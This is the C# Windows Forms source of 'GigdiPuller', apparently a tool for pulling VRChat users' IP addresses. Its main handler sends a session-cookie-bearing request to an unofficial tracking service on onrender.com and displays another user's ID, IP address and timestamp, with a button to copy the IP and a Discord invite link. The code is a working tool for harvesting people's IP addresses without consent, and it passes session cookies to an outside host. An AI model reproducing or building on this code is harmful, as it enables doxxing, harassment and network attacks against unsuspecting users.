using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using GigdiPuller;
using System.Collections.Specialized;
using System.Net;
using System.Net.Http;
using Newtonsoft.Json;

namespace GigdiPuller
{
    public partial class instancepuller : Form
    {
        public instancepuller()
        {
            InitializeComponent();
        }

        Point lastPoint;

        private void Panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.Left += e.X - lastPoint.X;
                this.Top += e.Y - lastPoint.Y;
            }
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            lastPoint = new Point(e.X, e.Y);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            string instanceid = instance.Text;  // Get instance ID from textbox

            // Create an instance of HttpClientHandler to include cookies
            using (HttpClientHandler handler = new HttpClientHandler())
            {
                // Use a handler to include the cookies from the current session
                handler.CookieContainer = CookieHelper.CookieContainer; // Use the cookies stored in the shared container

                using (HttpClient client = new HttpClient(handler))
                {
                    try
                    {
                        // Construct the tracking URL with the endpoint ID
                        string url = "https://vrchatapi.onrender.com/vrchat/api/v1/track/" + instanceid;

                        // Send GET request to the tracking API with cookies
                        HttpResponseMessage response = await client.GetAsync(url);
                        response.EnsureSuccessStatusCode();

                        // Deserialize the JSON response
                        string result = await response.Content.ReadAsStringAsync();
                        dynamic results = JsonConvert.DeserializeObject(result);

                        // Check if the 'pulled' array exists and has data
                        if (results.pulled != null && results.pulled.Count > 0)
                        {
                            // Assuming the response contains a 'pulled' array with the tracking data
                            var pulledData = results.pulled[0];  // Grab the first item in the array

                            // Extract the required fields: userId, ip, endpointId, timestamp
                            string userId2 = pulledData.userId;
                            string ip = pulledData.ip;
                            string endpointId = pulledData.endpointId;
                            string timestamp = pulledData.timestamp;

                            // Display the extracted data in the form's labels or textboxes
                            user2ID.Text = userId2;         // Display userId
                            user2ip.Text = ip;             // Display IP
                            InstanceID.Text = endpointId;    // Display endpoint ID
                            user2timestamp.Text = timestamp; // Display timestamp 
                        }
                        else
                        {
                            MessageBox.Show("No data found for the given instance or tracking information is unavailable.", "No Data", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                    }
                    catch (Exception ex)
                    {
                        // Handle any exceptions (e.g., network issues, invalid instance, etc.)
                        MessageBox.Show($"Error: {ex.Message}", "Tracking Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            
        }

        private void ScriptHub_Load(object sender, EventArgs e)
        {
            // Any initialization logic for ScriptHub
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            // Your listbox logic if any
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {
            // Panel paint logic if any
        }

        private void ScriptBox_Load(object sender, EventArgs e)
        {
            
        }

        private void label3_Click(object sender, EventArgs e)
        {
            Process.Start("discord.gg/7cyrKZcj8W"); // Open the Discord link
        }

        private void method_TextChanged(object sender, EventArgs e)
        {
            // Logic for method text changes if any
        }

        private void button6_Click(object sender, EventArgs e)
        {
            
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(user2ip.Text);  // Copy IP to clipboard
            MessageBox.Show("Successfully Copied To Clipboard!");
        }
    }
}
